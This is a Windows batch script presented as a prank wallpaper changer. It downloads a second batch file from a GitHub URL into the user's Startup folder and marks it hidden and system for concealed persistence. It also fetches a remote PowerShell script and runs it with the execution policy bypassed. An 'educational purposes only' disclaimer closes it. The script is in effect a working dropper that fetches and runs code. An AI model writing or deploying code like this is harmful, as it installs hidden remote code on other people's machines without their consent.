@echo off
setlocal enabledelayedexpansion

set defaultScriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/set.ps1
set defaultImageURL=https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg
set defaultDelayHours=0

set scriptPath1=%userprofile%\AppData\Local\Temp\set.ps1
set batchURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat
set batchPath=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat
set configPath=%userprofile%\WC\config.txt

:: WC = WallpaperChanger
if not exist "%userprofile%\WC" (
    mkdir "%userprofile%\WC"
)

if not exist "%configPath%" (
    echo First run detected. Please enter the following details or press Enter to use defaults.
    set /p userScriptURL="Enter Script URL (default: %defaultScriptURL%): "
    set /p userImageURL="Enter Image URL (default: %defaultImageURL%): "
    set /p userDelayHours="Enter delay in hours before wallpaper change (default: %defaultDelayHours% | 0 = no delay): "

    if "%userScriptURL%"=="" set userScriptURL=%defaultScriptURL%
    if "%userImageURL%"=="" set userImageURL=%defaultImageURL%
    if "%userDelayHours%"=="" set userDelayHours=%defaultDelayHours%

    echo Saving configuration...
    echo scriptURL=%userScriptURL%> "%configPath%"
    echo imageURL=%userImageURL%>> "%configPath%"
    echo delayHours=%userDelayHours%>> "%configPath%"
) else (
    echo Loading configuration from config.txt...
    for /f "tokens=1,2 delims==" %%i in ('type "%configPath%"') do (
        set %%i=%%j
    )
)

echo Configuration loaded:
echo Script URL: %scriptURL%
echo Image URL: %imageURL%
echo Delay Hours: %delayHours%

if not exist "%batchPath%" (
    echo Downloading batch file from %batchURL%...
    curl -o "%batchPath%" -L "%batchURL%"
    if %errorlevel% neq 0 (
        echo curl download failed for batch file, switching to Invoke-WebRequest.
        powershell -Command "Invoke-WebRequest -Uri '%batchURL%' -OutFile '%batchPath%' -UseBasicParsing"
    )
    if not exist "%batchPath%" (
        echo Failed to download %batchPath%. Exiting.
        pause
        exit /b 1
    ) else (
        echo Batch file download succeeded.
        attrib +h +s "%batchPath%"
    )
)

echo Checking for the existence of %scriptPath1%...
if not exist "%scriptPath1%" (
    echo Downloading PowerShell script from %scriptURL%...
    curl -o "%scriptPath1%" -L "%scriptURL%"
    if %errorlevel% neq 0 (
        echo curl download failed for PowerShell script, switching to Invoke-WebRequest.
        powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%' -UseBasicParsing"
    )
    if not exist "%scriptPath1%" (
        echo Failed to download %scriptPath1%. Exiting.
        pause
        exit /b 1
    ) else (
        echo PowerShell script download succeeded.
    )
)

powershell -ExecutionPolicy Bypass -File "%scriptPath1%" -ArgumentList "%imageURL%", "%delayHours%"

timeout /t 10 >nul
exit
:: Educational purposes only!
